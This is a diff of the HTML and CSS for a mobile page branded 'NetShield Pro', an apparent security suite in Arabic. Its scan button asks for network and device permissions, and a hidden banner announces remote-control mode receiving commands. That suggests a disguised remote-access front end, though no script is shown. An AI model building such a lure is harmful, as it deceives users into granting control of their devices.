@@ -1,733 +1,1172 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>NetShield Security Suite</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>NetShield Pro | Ultimate Security Suite</title>
 
-<!-- PWA Manifest -->
-<link rel="manifest" href="/manifest.json">
-<meta name="theme-color" content="#080c14">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<meta name="apple-mobile-web-app-title" content="NetShield Pro">
+    <!-- PWA Manifest -->
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#080c14">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="NetShield Pro">
 
-<style>
-:root {
-  --bg-primary: #080c14;
-  --bg-secondary: #0f1621;
-  --bg-card: #131b27;
-  --bg-input: #1a2332;
-  --border: #1e2d40;
-  --text-primary: #e2e8f0;
-  --text-secondary: #94a3b8;
-  --text-muted: #64748b;
-  --accent: #0ea5e9;
-  --accent-dark: #0284c7;
-  --success: #10b981;
-  --warning: #f59e0b;
-  --danger: #ef4444;
-  --gradient-1: linear-gradient(135deg, #0ea5e9 0%, #6366f1 100%);
-  --shadow-sm: 0 1px 2px rgba(0,0,0,0.3);
-  --shadow-md: 0 4px 6px rgba(0,0,0,0.4);
-  --shadow-lg: 0 10px 25px rgba(0,0,0,0.5);
-  --shadow-glow: 0 0 20px rgba(14,165,233,0.15);
-  --radius-sm: 8px;
-  --radius-md: 14px;
-  --radius-lg: 20px;
-  --radius-xl: 28px;
-  --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-}
+    <style>
+        :root {
+            --bg-primary: #080c14;
+            --bg-secondary: #0f1621;
+            --bg-card: #131b27;
+            --bg-input: #1a2332;
+            --border: #1e2d40;
+            --text-primary: #e2e8f0;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --accent: #0ea5e9;
+            --accent-dark: #0284c7;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --gradient-1: linear-gradient(135deg, #0ea5e9 0%, #6366f1 100%);
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.3);
+            --shadow-md: 0 4px 6px rgba(0,0,0,0.4);
+            --shadow-lg: 0 10px 25px rgba(0,0,0,0.5);
+            --shadow-glow: 0 0 20px rgba(14,165,233,0.15);
+            --radius-sm: 8px;
+            --radius-md: 14px;
+            --radius-lg: 20px;
+            --radius-xl: 28px;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
 
-* { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-body {
-  font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-  background: var(--bg-primary);
-  color: var(--text-primary);
-  min-height: 100vh;
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
-  overflow-x: hidden;
-  line-height: 1.6;
-  -webkit-user-select: none;
-  -webkit-touch-callout: none;
-}
+        body {
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+            line-height: 1.6;
+            -webkit-user-select: none;
+            -webkit-touch-callout: none;
+        }
 
-.animated-bg {
-  position: fixed;
-  top: 0; left: 0;
-  width: 100%; height: 100%;
-  z-index: 0;
-  overflow: hidden;
-  pointer-events: none;
-}
-.orb {
-  position: absolute;
-  border-radius: 50%;
-  filter: blur(80px);
-  opacity: 0.06;
-  animation: orbFloat 20s infinite ease-in-out;
-}
-.orb:nth-child(1) { width: 400px; height: 400px; background: #0ea5e9; top: -100px; left: -100px; }
-.orb:nth-child(2) { width: 350px; height: 350px; background: #6366f1; bottom: -80px; right: -80px; animation-delay: -7s; }
-.orb:nth-child(3) { width: 300px; height: 300px; background: #10b981; top: 50%; left: 50%; animation-delay: -14s; }
-@keyframes orbFloat {
-  0%, 100% { transform: translate(0, 0) scale(1); }
-  25% { transform: translate(100px, -50px) scale(1.1); }
-  50% { transform: translate(50px, 100px) scale(0.9); }
-  75% { transform: translate(-80px, 30px) scale(1.05); }
-}
+        .animated-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+            pointer-events: none;
+        }
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.06;
+            animation: orbFloat 20s infinite ease-in-out;
+        }
+        .orb:nth-child(1) { width: 400px; height: 400px; background: #0ea5e9; top: -100px; left: -100px; }
+        .orb:nth-child(2) { width: 350px; height: 350px; background: #6366f1; bottom: -80px; right: -80px; animation-delay: -7s; }
+        .orb:nth-child(3) { width: 300px; height: 300px; background: #10b981; top: 50%; left: 50%; animation-delay: -14s; }
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(100px, -50px) scale(1.1); }
+            50% { transform: translate(50px, 100px) scale(0.9); }
+            75% { transform: translate(-80px, 30px) scale(1.05); }
+        }
 
-.grid-pattern {
-  position: fixed;
-  top: 0; left: 0;
-  width: 100%; height: 100%;
-  z-index: 0;
-  opacity: 0.015;
-  background-image: linear-gradient(rgba(14,165,233,0.5) 1px, transparent 1px),
-                    linear-gradient(90deg, rgba(14,165,233,0.5) 1px, transparent 1px);
-  background-size: 50px 50px;
-  pointer-events: none;
-}
+        .grid-pattern {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.015;
+            background-image: linear-gradient(rgba(14,165,233,0.5) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(14,165,233,0.5) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+        }
 
-.main-container {
-  position: relative;
-  z-index: 1;
-  max-width: 480px;
-  margin: 0 auto;
-  padding: 16px;
-}
+        .main-container {
+            position: relative;
+            z-index: 1;
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 16px;
+        }
 
-.header {
-  text-align: center;
-  padding: 20px 0 10px;
-}
-.logo-container {
-  position: relative;
-  display: inline-block;
-  margin-bottom: 16px;
-}
-.logo-hex {
-  width: 80px;
-  height: 80px;
-  background: var(--gradient-1);
-  clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  box-shadow: var(--shadow-glow);
-}
-.logo-hex svg { width: 40px; height: 40px; fill: #fff; }
-.logo-ring {
-  position: absolute;
-  top: -8px; left: -8px;
-  width: 96px; height: 96px;
-  border: 2px solid rgba(14,165,233,0.3);
-  border-radius: 50%;
-  animation: ringPulse 3s infinite;
-}
-@keyframes ringPulse {
-  0%, 100% { transform: scale(1); opacity: 0.3; }
-  50% { transform: scale(1.1); opacity: 0.8; }
-}
-.header h1 {
-  font-size: 28px;
-  font-weight: 800;
-  background: var(--gradient-1);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-  letter-spacing: -0.5px;
-}
-.header .subtitle {
-  font-size: 13px;
-  color: var(--text-muted);
-  margin-top: 4px;
-  letter-spacing: 1px;
-  text-transform: uppercase;
-}
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 20px 0 10px;
+        }
+        .logo-container {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 16px;
+        }
+        .logo-hex {
+            width: 80px;
+            height: 80px;
+            background: var(--gradient-1);
+            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: var(--shadow-glow);
+            margin: 0 auto 16px;
+        }
+        .logo-hex svg {
+            width: 40px;
+            height: 40px;
+            fill: #fff;
+        }
+        .logo-ring {
+            position: absolute;
+            top: -8px;
+            left: -8px;
+            width: 96px;
+            height: 96px;
+            border: 2px solid rgba(14,165,233,0.3);
+            border-radius: 50%;
+            animation: ringPulse 3s infinite;
+        }
+        @keyframes ringPulse {
+            0%, 100% { transform: scale(1); opacity: 0.3; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+        .header h1 {
+            font-size: 28px;
+            font-weight: 800;
+            background: var(--gradient-1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.5px;
+        }
+        .header .subtitle {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-top: 4px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
 
-.status-bar {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  background: var(--bg-card);
-  border: 1px solid var(--border);
-  border-radius: var(--radius-lg);
-  padding: 16px 20px;
-  margin: 20px 0;
-  box-shadow: var(--shadow-md);
-}
-.status-indicator { display: flex; align-items: center; gap: 10px; }
-.status-dot {
-  width: 10px; height: 10px;
-  border-radius: 50%;
-  background: var(--danger);
-  box-shadow: 0 0 10px rgba(239,68,68,0.5);
-}
-.status-dot.protected {
-  background: var(--success);
-  box-shadow: 0 0 10px rgba(16,185,129,0.5);
-}
-.status-info .status-title { font-size: 14px; font-weight: 600; }
-.status-info .status-desc { font-size: 11px; color: var(--text-muted); }
-.status-icon {
-  width: 44px; height: 44px;
-  border-radius: var(--radius-md);
-  background: rgba(14,165,233,0.1);
-  display: flex; align-items: center; justify-content: center;
-}
-.status-icon svg { width: 24px; height: 24px; fill: var(--accent); }
+        /* Status Bar */
+        .status-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 16px 20px;
+            margin: 20px 0;
+            box-shadow: var(--shadow-md);
+        }
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--danger);
+            box-shadow: 0 0 10px rgba(239,68,68,0.5);
+        }
+        .status-dot.protected {
+            background: var(--success);
+            box-shadow: 0 0 10px rgba(16,185,129,0.5);
+        }
+        .status-info .status-title {
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .status-info .status-desc {
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+        .status-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: var(--radius-md);
+            background: rgba(14,165,233,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .status-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: var(--accent);
+        }
 
-.metrics-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
-.metric-card {
-  background: var(--bg-card); border: 1px solid var(--border);
-  border-radius: var(--radius-md); padding: 16px; text-align: center;
-  box-shadow: var(--shadow-sm); transition: var(--transition);
-}
-.metric-value { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; }
-.metric-value.up { color: var(--success); }
-.metric-value.down { color: var(--danger); }
-.metric-label { font-size: 11px; color: var(--text-muted); margin-top: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
+        /* Metrics Grid */
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .metric-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-md);
+            padding: 16px;
+            text-align: center;
+            box-shadow: var(--shadow-sm);
+            transition: var(--transition);
+        }
+        .metric-value {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .metric-value.up { color: var(--success); }
+        .metric-value.down { color: var(--danger); }
+        .metric-label {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
 
-.section { margin: 20px 0; }
-.section-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
-.section-icon {
-  width: 36px; height: 36px; border-radius: var(--radius-sm);
-  display: flex; align-items: center; justify-content: center;
-}
-.section-icon svg { width: 20px; height: 20px; }
-.section-icon.blue { background: rgba(14,165,233,0.12); }
-.section-icon.blue svg { fill: var(--accent); }
-.section-title { font-size: 16px; font-weight: 700; }
+        /* Section */
+        .section {
+            margin: 20px 0;
+        }
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        .section-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: var(--radius-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .section-icon svg { width: 20px; height: 20px; }
+        .section-icon.blue { background: rgba(14,165,233,0.12); }
+        .section-icon.blue svg { fill: var(--accent); }
+        .section-title {
+            font-size: 16px;
+            font-weight: 700;
+        }
 
-.feature-list {
-  background: var(--bg-card); border: 1px solid var(--border);
-  border-radius: var(--radius-lg); overflow: hidden;
-}
-.feature-item {
-  display: flex; align-items: center; gap: 14px;
-  padding: 16px 18px; border-bottom: 1px solid var(--border);
-}
-.feature-item:last-child { border-bottom: none; }
-.feature-icon-box {
-  width: 46px; height: 46px; border-radius: var(--radius-md);
-  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
-}
-.feature-icon-box svg { width: 22px; height: 22px; }
-.feature-icon-box.blue { background: rgba(14,165,233,0.12); }
-.feature-icon-box.blue svg { fill: var(--accent); }
-.feature-icon-box.green { background: rgba(16,185,129,0.12); }
-.feature-icon-box.green svg { fill: var(--success); }
-.feature-icon-box.purple { background: rgba(99,102,241,0.12); }
-.feature-icon-box.purple svg { fill: #6366f1; }
-.feature-icon-box.amber { background: rgba(245,158,11,0.12); }
-.feature-icon-box.amber svg { fill: var(--warning); }
-.feature-content { flex: 1; }
-.feature-content h4 { font-size: 14px; font-weight: 600; margin-bottom: 2px; }
-.feature-content p { font-size: 11px; color: var(--text-muted); }
-.feature-badge {
-  font-size: 10px; padding: 4px 10px; border-radius: 20px;
-  font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase;
-}
-.feature-badge.new { background: rgba(14,165,233,0.15); color: var(--accent); }
-.feature-badge.pro { background: rgba(99,102,241,0.15); color: #6366f1; }
+        /* Feature List */
+        .feature-list {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+        }
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 16px 18px;
+            border-bottom: 1px solid var(--border);
+        }
+        .feature-item:last-child { border-bottom: none; }
+        .feature-icon-box {
+            width: 46px;
+            height: 46px;
+            border-radius: var(--radius-md);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .feature-icon-box svg { width: 22px; height: 22px; }
+        .feature-icon-box.blue { background: rgba(14,165,233,0.12); }
+        .feature-icon-box.blue svg { fill: var(--accent); }
+        .feature-icon-box.green { background: rgba(16,185,129,0.12); }
+        .feature-icon-box.green svg { fill: var(--success); }
+        .feature-icon-box.purple { background: rgba(99,102,241,0.12); }
+        .feature-icon-box.purple svg { fill: #6366f1; }
+        .feature-icon-box.amber { background: rgba(245,158,11,0.12); }
+        .feature-icon-box.amber svg { fill: var(--warning); }
+        .feature-content { flex: 1; }
+        .feature-content h4 { font-size: 14px; font-weight: 600; margin-bottom: 2px; }
+        .feature-content p { font-size: 11px; color: var(--text-muted); }
+        .feature-badge {
+            font-size: 10px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        .feature-badge.new { background: rgba(14,165,233,0.15); color: var(--accent); }
+        .feature-badge.pro { background: rgba(99,102,241,0.15); color: #6366f1; }
 
-.scan-section { margin: 24px 0; text-align: center; }
-.btn-scan {
-  width: 100%; padding: 18px 24px;
-  background: var(--gradient-1); color: #fff;
-  border: none; border-radius: var(--radius-xl);
-  font-size: 17px; font-weight: 700; cursor: pointer;
-  letter-spacing: 0.3px;
-  box-shadow: 0 8px 30px rgba(14,165,233,0.3);
-  transition: var(--transition);
-}
-.btn-scan:active { transform: scale(0.96); }
-.btn-scan:disabled { background: var(--bg-card); color: var(--text-muted); box-shadow: none; cursor: not-allowed; }
-.scan-hint { font-size: 11px; color: var(--text-muted); margin-top: 10px; }
+        /* Scan Section */
+        .scan-section {
+            margin: 24px 0;
+            text-align: center;
+        }
+        .btn-scan {
+            width: 100%;
+            padding: 18px 24px;
+            background: var(--gradient-1);
+            color: #fff;
+            border: none;
+            border-radius: var(--radius-xl);
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+            box-shadow: 0 8px 30px rgba(14,165,233,0.3);
+            transition: var(--transition);
+        }
+        .btn-scan:active { transform: scale(0.96); }
+        .btn-scan:disabled {
+            background: var(--bg-card);
+            color: var(--text-muted);
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        .scan-hint {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 10px;
+        }
 
-.permission-prompt {
-  background: var(--bg-card); border: 1px solid var(--warning);
-  border-radius: var(--radius-md); padding: 12px; margin: 10px 0;
-  display: none; text-align: center;
-}
-.permission-prompt p { color: var(--warning); font-size: 13px; margin-bottom: 8px; }
-.permission-prompt button {
-  background: var(--warning); color: #000; border: none;
-  padding: 8px 20px; border-radius: 20px; font-weight: 600; cursor: pointer;
-}
+        /* Permission Prompt */
+        .permission-prompt {
+            background: var(--bg-card);
+            border: 1px solid var(--warning);
+            border-radius: var(--radius-md);
+            padding: 12px;
+            margin: 10px 0;
+            display: none;
+            text-align: center;
+        }
+        .permission-prompt p {
+            color: var(--warning);
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+        .permission-prompt button {
+            background: var(--warning);
+            color: #000;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: 600;
+            cursor: pointer;
+        }
 
-.progress-wrapper {
-  background: var(--bg-card); border: 1px solid var(--border);
-  border-radius: var(--radius-lg); padding: 20px; margin: 20px 0; display: none;
-}
-.progress-steps { display: flex; justify-content: space-between; margin-bottom: 16px; }
-.progress-step {
-  width: 28px; height: 28px; border-radius: 50%;
-  background: var(--bg-input); border: 2px solid var(--border);
-  display: flex; align-items: center; justify-content: center;
-  font-size: 11px; font-weight: 700; color: var(--text-muted);
-  transition: var(--transition);
-}
-.progress-step.done { background: var(--success); border-color: var(--success); color: #fff; }
-.progress-step.active { border-color: var(--accent); color: var(--accent); box-shadow: 0 0 10px rgba(14,165,233,0.4); }
-.progress-bar-container { background: var(--bg-input); border-radius: 10px; height: 6px; overflow: hidden; }
-.progress-bar-fill { height: 100%; background: var(--gradient-1); width: 0%; border-radius: 10px; transition: width 0.5s ease; }
-.progress-text { text-align: center; font-size: 13px; color: var(--text-secondary); margin-top: 12px; }
+        /* Progress */
+        .progress-wrapper {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 20px;
+            margin: 20px 0;
+            display: none;
+        }
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+        .progress-step {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: var(--bg-input);
+            border: 2px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--text-muted);
+            transition: var(--transition);
+        }
+        .progress-step.done {
+            background: var(--success);
+            border-color: var(--success);
+            color: #fff;
+        }
+        .progress-step.active {
+            border-color: var(--accent);
+            color: var(--accent);
+            box-shadow: 0 0 10px rgba(14,165,233,0.4);
+        }
+        .progress-bar-container {
+            background: var(--bg-input);
+            border-radius: 10px;
+            height: 6px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: var(--gradient-1);
+            width: 0%;
+            border-radius: 10px;
+            transition: width 0.5s ease;
+        }
+        .progress-text {
+            text-align: center;
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-top: 12px;
+        }
 
-.alert { border-radius: var(--radius-md); padding: 16px; margin: 16px 0; display: none; }
-.alert-success { background: rgba(16,185,129,0.08); border: 1px solid rgba(16,185,129,0.2); }
-.alert-danger { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.2); }
-.alert-header { display: flex; align-items: center; gap: 8px; margin-bottom: 6px; }
-.alert-header svg { width: 20px; height: 20px; }
-.alert-success .alert-header svg { fill: var(--success); }
-.alert-danger .alert-header svg { fill: var(--danger); }
-.alert-header h4 { font-size: 14px; font-weight: 600; }
-.alert p { font-size: 12px; color: var(--text-secondary); }
+        /* Alert */
+        .alert {
+            border-radius: var(--radius-md);
+            padding: 16px;
+            margin: 16px 0;
+            display: none;
+        }
+        .alert-success {
+            background: rgba(16,185,129,0.08);
+            border: 1px solid rgba(16,185,129,0.2);
+        }
+        .alert-danger {
+            background: rgba(239,68,68,0.08);
+            border: 1px solid rgba(239,68,68,0.2);
+        }
+        .alert-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 6px;
+        }
+        .alert-header svg { width: 20px; height: 20px; }
+        .alert-success .alert-header svg { fill: var(--success); }
+        .alert-danger .alert-header svg { fill: var(--danger); }
+        .alert-header h4 { font-size: 14px; font-weight: 600; }
+        .alert p { font-size: 12px; color: var(--text-secondary); }
 
-.remote-indicator {
-  display: none;
-  background: rgba(14,165,233,0.08); border: 1px solid rgba(14,165,233,0.2);
-  border-radius: var(--radius-md); padding: 10px 16px; margin: 12px 0;
-  font-size: 12px; color: var(--accent); text-align: center;
-  animation: pulse 2s infinite;
-}
-@keyframes pulse { 0%,100%{opacity:0.7} 50%{opacity:1} }
+        /* Remote Indicator */
+        .remote-indicator {
+            display: none;
+            background: rgba(14,165,233,0.08);
+            border: 1px solid rgba(14,165,233,0.2);
+            border-radius: var(--radius-md);
+            padding: 10px 16px;
+            margin: 12px 0;
+            font-size: 12px;
+            color: var(--accent);
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
 
-.footer { text-align: center; padding: 24px 0; border-top: 1px solid var(--border); margin-top: 20px; }
-.footer-logo { font-size: 13px; font-weight: 700; color: var(--text-muted); letter-spacing: 1px; }
-.footer-text { font-size: 10px; color: var(--text-muted); margin-top: 4px; opacity: 0.6; }
-</style>
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 24px 0;
+            border-top: 1px solid var(--border);
+            margin-top: 20px;
+        }
+        .footer-logo {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+        }
+        .footer-text {
+            font-size: 10px;
+            color: var(--text-muted);
+            margin-top: 4px;
+            opacity: 0.6;
+        }
+    </style>
 </head>
 <body>
 
-<div class="animated-bg">
-  <div class="orb"></div>
-  <div class="orb"></div>
-  <div class="orb"></div>
-</div>
-<div class="grid-pattern"></div>
-
-<div class="main-container">
-
-  <div class="header">
-    <div class="logo-container">
-      <div class="logo-ring"></div>
-      <div class="logo-hex">
-        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-      </div>
+    <!-- Animated Background -->
+    <div class="animated-bg">
+        <div class="orb"></div>
+        <div class="orb"></div>
+        <div class="orb"></div>
     </div>
-    <h1>NetShield Pro</h1>
-    <p class="subtitle">Advanced Network Security Suite</p>
-  </div>
+    <div class="grid-pattern"></div>
 
-  <div class="remote-indicator" id="remoteIndicator">
-    وضع التحكم عن بعد نشط - جاري استقبال الاوامر
-  </div>
+    <!-- Main Container -->
+    <div class="main-container">
 
-  <div class="status-bar">
-    <div class="status-indicator">
-      <div class="status-dot" id="mainStatusDot"></div>
-      <div class="status-info">
-        <div class="status-title" id="mainStatusTitle">غير محمي</div>
-        <div class="status-desc" id="mainStatusDesc">الفحص مطلوب</div>
-      </div>
+        <!-- Header -->
+        <div class="header">
+            <div class="logo-container">
+                <div class="logo-ring"></div>
+                <div class="logo-hex">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                </div>
+            </div>
+            <h1>NetShield Pro</h1>
+            <p class="subtitle">Advanced Network Security Suite</p>
+        </div>
+
+        <!-- Remote Indicator -->
+        <div class="remote-indicator" id="remoteIndicator">
+            وضع التحكم عن بعد نشط - جاري استقبال الاوامر
+        </div>
+
+        <!-- Status Bar -->
+        <div class="status-bar">
+            <div class="status-indicator">
+                <div class="status-dot" id="mainStatusDot"></div>
+                <div class="status-info">
+                    <div class="status-title" id="mainStatusTitle">غير محمي</div>
+                    <div class="status-desc" id="mainStatusDesc">الفحص مطلوب</div>
+                </div>
+            </div>
+            <div class="status-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+            </div>
+        </div>
+
+        <!-- Metrics Grid -->
+        <div class="metrics-grid">
+            <div class="metric-card"><div class="metric-value up" id="speedValue">--</div><div class="metric-label">سرعة الاتصال (Mbps)</div></div>
+            <div class="metric-card"><div class="metric-value down" id="threatsValue">0</div><div class="metric-label">تهديدات مكتشفة</div></div>
+            <div class="metric-card"><div class="metric-value" id="devicesValue">1</div><div class="metric-label">جهاز متصل</div></div>
+            <div class="metric-card"><div class="metric-value" id="pingValue">--</div><div class="metric-label">زمن الاستجابة (ms)</div></div>
+        </div>
+
+        <!-- Features Section -->
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon blue">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                </div>
+                <h3 class="section-title">ميزات الحماية</h3>
+            </div>
+            <div class="feature-list">
+                <div class="feature-item">
+                    <div class="feature-icon-box blue">
+                        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                    </div>
+                    <div class="feature-content">
+                        <h4>جدار ناري ذكي</h4>
+                        <p>حماية فورية ضد التهديدات والاختراقات</p>
+                    </div>
+                    <span class="feature-badge new">نشط</span>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon-box green">
+                        <svg viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/></svg>
+                    </div>
+                    <div class="feature-content">
+                        <h4>فحص الشبكة السحابي</h4>
+                        <p>تحليل شامل للشبكة باستخدام الذكاء الاصطناعي</p>
+                    </div>
+                    <span class="feature-badge pro">Pro</span>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon-box purple">
+                        <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+                    </div>
+                    <div class="feature-content">
+                        <h4>تحسين اداء الشبكة</h4>
+                        <p>تسريع الاتصال وتقليل زمن الاستجابة</p>
+                    </div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon-box amber">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+                    </div>
+                    <div class="feature-content">
+                        <h4>مراقبة النشاط</h4>
+                        <p>تتبع وتحليل كل الانشطة على الشبكة</p>
+                    </div>
+                    <span class="feature-badge new">جديد</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Scan Button -->
+        <div class="scan-section">
+            <button class="btn-scan" id="btnStartScan" onclick="checkAllPermissions()">
+                بدء الفحص الامني الشامل
+            </button>
+            <p class="scan-hint">يحتاج الفحص الى صلاحيات الشبكة والجهاز</p>
+        </div>
+
+        <!-- Permission Prompt -->
+        <div id="permissionPrompt" class="permission-prompt">
+            <p id="permissionText">مطلوب مزيد من الصلاحيات</p>
+            <button onclick="requestMissingPermissions()">منح الصلاحيات</button>
